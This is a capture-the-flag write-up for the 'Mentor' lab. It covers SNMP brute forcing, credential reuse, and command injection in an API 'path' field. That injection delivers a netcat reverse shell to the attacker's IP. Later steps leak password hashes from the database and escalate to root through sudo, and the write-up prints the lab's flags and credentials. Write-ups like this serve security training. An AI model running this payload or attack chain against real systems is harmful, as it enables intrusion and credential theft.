# CTF Writeup: Mentor

## Lab Description

Mentor is a medium difficulty Linux machine whose path includes pivoting through four different users before arriving at root. After scanning an `SNMP` service with a community string that can be brute forced, plaintext credentials are discovered which are used for an `API` endpoint, which proves to be vulnerable to blind remote code execution and leads to a foothold on a docker container. Enumerating the container&amp;amp;amp;amp;#039;s network reveals a `PostgreSQL` service on another container, which can be leveraged into RCE by authenticating using default credentials. Examining an old database backup on the `PostgreSQL` container reveals a hash, which once cracked is used to `SSH` into the machine. Finally, by examining the configuration files on the host, the attacker is able to retrieve a password for user `james`, who is able run the `/bin/sh` command with sudo privileges, thereby instantly forfeiting `root` privileges. 

---


## Reconaissance


An initial scan revealed the following information about running services on the target server.

```
nmap -A -p- --min-rate 10000 10.129.228.102
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-25 19:45 EDT
Nmap scan report for 10.129.228.102
Host is up (0.024s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c7:3b:fc:3c:f9:ce:ee:8b:48:18:d5:d1:af:8e:c2:bb (ECDSA)
|_  256 44:40:08:4c:0e:cb:d4:f1:8e:7e:ed:a8:5c:68:a4:f7 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://mentorquotes.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: Host: mentorquotes.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 554/tcp)
HOP RTT      ADDRESS
1   28.57 ms 10.10.14.1
2   28.67 ms 10.129.228.102

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.70 seconds
```

The http website failed to redirect us to the domain mentorquotes.htb, let's map it to the target ip in our local dns file /etc/hosts.

```
sudo echo "10.129.228.102 mentorquotes.htb" | sudo tee -a /etc/hosts
```

There was no real attack vector, so I went back an performed an udp scan.

```
nmap -sU -F  10.129.228.102
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-25 20:19 EDT
Nmap scan report for mentorquotes.htb (10.129.228.102)
Host is up (0.025s latency).
Not shown: 93 closed udp ports (port-unreach)
PORT      STATE         SERVICE
68/udp    open|filtered dhcpc
136/udp   open|filtered profile
161/udp   open          snmp
445/udp   open|filtered microsoft-ds
1026/udp  open|filtered win-rpc
49181/udp open|filtered unknown
65024/udp open|filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 101.92 seconds
```

Decided to enumerate for subdomains on the target.


```
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://10.129.228.102 -H 'Host: FUZZ.mentorquotes.htb' -mc 200,404 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.228.102
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.mentorquotes.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,404
________________________________________________

api                     [Status: 404, Size: 22, Words: 2, Lines: 1, Duration: 22ms]
:: Progress: [4989/4989] :: Job [1/1] :: 1333 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
```

Let's enumerate endpoints on the subdomain.


```
dirsearch -u http://api.mentorquotes.htb/
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/saitama/Desktop/Methodology/Enumeration/Fuzzing/SubdomainEnum/reports/http_api.mentorquotes.htb/__25-10-25_20-34-47.txt

Target: http://api.mentorquotes.htb/

[20:34:47] Starting: 
[20:34:57] 307 -    0B  - /admin  ->  http://api.mentorquotes.htb/admin/    
[20:34:57] 422 -  186B  - /admin/                                           
[20:34:58] 307 -    0B  - /admin/backup/  ->  http://api.mentorquotes.htb/admin/backup
[20:35:08] 405 -   31B  - /auth/login                                       
[20:35:16] 200 -  969B  - /docs                                             
[20:35:16] 307 -    0B  - /docs/  ->  http://api.mentorquotes.htb/docs      
[20:35:26] 200 -    7KB - /openapi.json                                     
[20:35:30] 200 -  772B  - /redoc                                            
[20:35:31] 403 -  285B  - /server-status                                    
[20:35:31] 403 -  285B  - /server-status/                                   
[20:35:37] 307 -    0B  - /users  ->  http://api.mentorquotes.htb/users/    
[20:35:37] 307 -    0B  - /users/admin.php  ->  http://api.mentorquotes.htb/users/admin.php/
[20:35:37] 422 -  186B  - /users/                                           
[20:35:37] 307 -    0B  - /users/admin  ->  http://api.mentorquotes.htb/users/admin/
[20:35:37] 307 -    0B  - /users/login  ->  http://api.mentorquotes.htb/users/login/
[20:35:37] 307 -    0B  - /users/login.aspx  ->  http://api.mentorquotes.htb/users/login.aspx/
[20:35:37] 307 -    0B  - /users/login.jsp  ->  http://api.mentorquotes.htb/users/login.jsp/
[20:35:37] 307 -    0B  - /users/login.php  ->  http://api.mentorquotes.htb/users/login.php/
[20:35:37] 307 -    0B  - /users/login.html  ->  http://api.mentorquotes.htb/users/login.html/
[20:35:37] 307 -    0B  - /users/login.js  ->  http://api.mentorquotes.htb/users/login.js/
                                                                             
Task Completed
```

Discovered multiple api endpoints, including an exposed /admin panel.

Displaying /docs endpoint provides us the api index page.

There is an api functionality, which creates an user acc, let's try it!

```
curl api.mentorquotes.htb/auth/signup -X POST -H 'Content-Type: application/json' -d '{"email":"saitama@mentorquotes.htb","username":"saitama","password":"password"}'
{"id":4,"email":"saitama@mentorquotes.htb","username":"saitama"}
```

Let's login into our account by sending an request to /auth/login

```
curl api.mentorquotes.htb/auth/login -X POST -H 'Content-Type: application/json' -d '{"email":"saitama@mentorquotes.htb","username":"saitama","password":"password"}'
"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InNhaXRhbWEiLCJlbWFpbCI6InNhaXRhbWFAbWVudG9ycXVvdGVzLmh0YiJ9.WNB7KeGGSct2nO1sHaeBvYb2i-KwQxrQsIoOqHp5-f8"
```

We retrieved an JSON Web Token back.

Let's try to access the /admin panel.

```
curl http://api.mentorquotes.htb/admin/ -H "Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InNhaXRhbWEiLCJlbWFpbCI6InNhaXRhbWFAbWVudG9ycXVvdGVzLmh0YiJ9.WNB7KeGGSct2nO1sHaeBvYb2i-KwQxrQsIoOqHp5-f8"
{"detail":"Only admin users can access this resource"}
```

Since we couldn't gain access to the /admin endpoint running on the http server, we will prob need to elevate our privileges I'm assuming the snmp service we enumerated could help us with that-

Let's try and enumerate potential information, in order to do so we will first need to retrieve the community string, which is the password of the SNMP Server. We can retrieve by utilizing the tool "onesixtyone"

```
onesixtyone -c /usr/share/SecLists/Discovery/SNMP/snmp-onesixtyone.txt 10.129.228.102
```

This didn't provide us with information, let's try an different wordlist.


```
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 10.129.228.102
Scanning 1 hosts, 120 communities
10.129.228.102 [public] Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64
10.129.228.102 [public] Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64
```

Enumerated [public] community strong, let's move on with the process of gathering information of the SNMP user, therefore we can abuse the snmp-check tool


```
snmp-check -c public 10.129.228.102
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 10.129.228.102:161 using SNMPv1 and community 'public'

[*] System information:

  Host IP address               : 10.129.228.102
  Hostname                      : mentor
  Description                   : Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64
  Contact                       : Me <admin@mentorquotes.htb>
  Location                      : Sitting on the Dock of the Bay
  Uptime snmp                   : 02:05:58.83
  Uptime system                 : 02:05:48.68
  System date                   : 2025-10-26 01:03:20.0
```

This also gave us basic information, let's try and bruteforce hidden community strings utilizing an tool called snmpbrute.py

```
git clone https://github.com/SECFORCE/SNMP-Brute
```
```
python3 snmpbrute.py -t 10.129.228.102 -f /usr/share/wordlists/SecLists/Discovery/SNMP/common-snmp-community-strings.txt
   _____ _   ____  _______     ____             __     
  / ___// | / /  |/  / __ \   / __ )_______  __/ /____ 
  \__ \/  |/ / /|_/ / /_/ /  / __  / ___/ / / / __/ _ \
 ___/ / /|  / /  / / ____/  / /_/ / /  / /_/ / /_/  __/
/____/_/ |_/_/  /_/_/      /_____/_/   \__,_/\__/\___/ 

SNMP Bruteforce & Enumeration Script v2.0
http://www.secforce.com / nikos.vassakis <at> secforce.com
###############################################################

Trying ['public', 'private', '0', '0392a0', '1234', '2read', '4changes', 'ANYCOM', 'Admin', 'C0de', 'CISCO', 'CR52401', 'IBM', 'ILMI', 'Intermec', 'NoGaH$@!', 'OrigEquipMfr', 'PRIVATE', 'PUBLIC', 'Private', 'Public', 'SECRET', 'SECURITY', 'SNMP', 'SNMP_trap', 'SUN', 'SWITCH', 'SYSTEM', 'Secret', 'Security', 'Switch', 'System', 'TENmanUFactOryPOWER', 'TEST', 'access', 'adm', 'admin', 'agent', 'agent_steal', 'all', 'all private', 'all public', 'apc', 'bintec', 'blue', 'c', 'cable-d', 'canon_admin', 'cc', 'cisco', 'community', 'core', 'debug', 'default', 'dilbert', 'enable', 'field', 'field-service', 'freekevin', 'fubar', 'guest', 'hello', 'hp_admin', 'ibm', 'ilmi', 'intermec', 'internal', 'l2', 'l3', 'manager', 'mngt', 'monitor', 'netman', 'network', 'none', 'openview', 'pass', 'password', 'pr1v4t3', 'proxy', 'publ1c', 'read', 'read-only', 'read-write', 'readwrite', 'red', 'regional', 'rmon', 'rmon_admin', 'ro', 'root', 'router', 'rw', 'rwa', 'san-fran', 'sanfran', 'scotty', 'secret', 'security', 'seri', 'snmp', 'snmpd', 'snmptrap', 'solaris', 'sun', 'superuser', 'switch', 'system', 'tech', 'test', 'test2', 'tiv0li', 'tivoli', 'trap', 'world', 'write', 'xyzzy', 'yellow'] community strings ...
10.129.228.102 : 161    Version (v1):   public
10.129.228.102 : 161    Version (v2c):  public
10.129.228.102 : 161    Version (v2c):  internal
Waiting for late packets (CTRL+C to stop)

Trying identified strings for READ-WRITE ...                                                                 

Identified Community strings                                                                                 
        0) 10.129.228.102  public (v1)(RO)
        1) 10.129.228.102  public (v2c)(RO)
        2) 10.129.228.102  internal (v2c)(RO)
```

This provides us with another hidden password string for the snmp-server called "internal".

Let's run snmp-check with the internal community string

```
snmp-check -c internal 10.129.228.102
```

Analyzing all of the output provided us with the information abt an login.py script and an potential password string.

```
snmpwalk -v2c -c internal 10.129.228.102
iso.3.6.1.2.1.25.4.2.1.5.2078 = STRING: "/usr/local/bin/login.py kj23sadkj123as0-d213"
```

On the api index webpage endpoint /docs we also enumerated an user called james and his mail is james@mentorquotes.htb, since we got an potential password, an username & an email address. Let's try to login into the /admin panel utilizing curl.

```
curl http://api.mentorquotes.htb/auth/login -X POST -H 'Content-Type: application/json' -d '{"email":"james@mentorquotes.htb","username":"james","password":"kj23sadkj123as0-d213"}'
"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0" 
```

We obtained the JWT again, which means we logged in successfully. Let's try and access the /admin panel now.

```
 curl http://api.mentorquotes.htb/admin/backup -X POST -H "Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0" -H 'Content-Type: application/json'
{"detail":[{"loc":["body"],"msg":"field required","type":"value_error.missing"}]}
```

It wants us to add an body, so let's add it. --> -d {}


```
curl http://api.mentorquotes.htb/admin/backup -X POST -H "Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0" -H 'Content-Type: application/json' -d {}
{"detail":[{"loc":["body","path"],"msg":"field required","type":"value_error.missing"}]}
```

It wants us to specifiy another parameter called "path". Let's add it asw

```
curl http://api.mentorquotes.htb/admin/backup -X POST -H "Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0" -H 'Content-Type: application/json' -d '{"path":"test"}'
{"INFO":"Done!"}
```

The path parameter seems interesting, let's test it for Command Injection.


Starting up a listener on port 1337

```
nc -lvnp 1337
```

Running the following request to the server & received RCE as user root (in docker env)

```
curl http://api.mentorquotes.htb/admin/backup -X POST -H "Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0" -H 'Content-Type: application/json' -d '{"path":"$(nc 10.10.14.186 1337 -e /bin/sh)"}'  
{"INFO":"Done!"}
```

```
nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.186] from (UNKNOWN) [10.129.228.102] 39551
whoami
root
```

Performed shell hardening

```
python3 -c 'import pty;pty.spawn("/bin/sh")' 
CTRL + Z
stty raw echo; fg
```


## Initial Access


Navigating into the / directory and doing ls -la confirms that we are in an docker container.

The models.py script is writable and we can add an parameter password to it, so the api retrieves the passwords of the user to us from the database.

```
/app/app/api # cat models.py
from pydantic import BaseModel, Field, EmailStr

# Quote model
class quoteSchema(BaseModel):
    title: str = Field(..., min_length=3, max_length=50) #additional validation for the inputs 
    description: str = Field(...,min_length=3, max_length=1500)

# 
class quoteDB(quoteSchema):
    id: int

# User model
class userSchema(BaseModel):
    email: EmailStr
    username: str = Field(...,min_length=5, max_length=50)
    password: str = Field(...,min_length=8, max_length=50)

class userDB(BaseModel):
    id: int
    email: str
    username: str
    password: str

# Token model
class token(BaseModel):
    token: str

# Backup data model
class backup(BaseModel):
    path: str
```

In order for this to work, we just need to add an parameter password: str inside the class userDB(BaseModel):

```
class userDB(BaseModel):
    id: int
    email: str
    username: str
    password: str
```

When we now send an request to the api endpoint, we get the response back with the password parameter aswell, all the passwords of the users from the database are now being displayed!

```
curl http://api.mentorquotes.htb/users/ -H "Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0"
[{"id":1,"email":"james@mentorquotes.htb","username":"james","password":"7ccdcd8c05b59add9c198d492b36a503"},{"id":2,"email":"svc@mentorquotes.htb","username":"service_acc","password":"53f22d0dfa10dce7e29cd31f4f953fd8"},{"id":4,"email":"saitama@mentorquotes.htb","username":"saitama","password":"5f4dcc3b5aa765d61d8327deb882cf99"}]
```

Those passwords are encoded tho! Let's utilize crackstation to encode the password of the svc user.


```
svc:123meunomeeivani
```

Let's login into ssh using those creds.

```
ssh svc@mentorquotes.htb                
The authenticity of host 'mentorquotes.htb (10.129.228.102)' can't be established.
ED25519 key fingerprint is SHA256:fkqwgXFJ5spB0IsQCmw4K5HTzEPyM27mczyMp6Qct5Q.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'mentorquotes.htb' (ED25519) to the list of known hosts.
svc@mentorquotes.htb's password: 
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-56-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Oct 26 02:23:28 AM UTC 2025

  System load:                      0.00537109375
  Usage of /:                       65.6% of 8.09GB
  Memory usage:                     15%
  Swap usage:                       0%
  Processes:                        267
  Users logged in:                  0
  IPv4 address for br-028c7a43f929: 172.20.0.1
  IPv4 address for br-24ddaa1f3b47: 172.19.0.1
  IPv4 address for br-3d63c18e314d: 172.21.0.1
  IPv4 address for br-7d5c72654da7: 172.22.0.1
  IPv4 address for br-a8a89c3bf6ff: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.129.228.102
  IPv6 address for eth0:            dead:beef::250:56ff:fe94:5f91

  => There are 9 zombie processes.


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Dec 12 10:22:58 2022 from 10.10.14.40
svc@mentor:~$
```

Retrieved user.txt in /home/svc directory.

```
9531358449a86ae85ca6ac5bfda3430f
```

## Privilege Escalation


Enumerated users on the target system.

```
svc@mentor:~$ cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
svc:x:1001:1001:,,,:/home/svc:/bin/bash
james:x:1000:1000:,,,:/home/james:/bin/bash
```

Tried a lot of things, which don't seem to work. The Lab Description hints to an configuration file, I'm assuming in the /etc directory, so let's further explore this directory.

Found password in /etc/snmp/snmpd.conf --> james:SuperSecurePassword123__

```
createUser bootstrap MD5 SuperSecurePassword123__ DES
```

Logged in as user james


```
svc@mentor:/etc/snmp$ su james
Password:
```

Made sudo -l

```
james@mentor:/etc/snmp$ sudo -l
[sudo] password for james: 
Matching Defaults entries for james on mentor:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User james may run the following commands on mentor:
    (ALL) /bin/sh
```

User james is allowed to run /bin/sh as root user without authentication which means we can get root shell


```
james@mentor:/etc/snmp$ sudo /bin/sh
# whoami
root
```

Retrieved root.txt in /root directory.

```
7b7670c46fee51624b0046ec0a5b4cc0
```
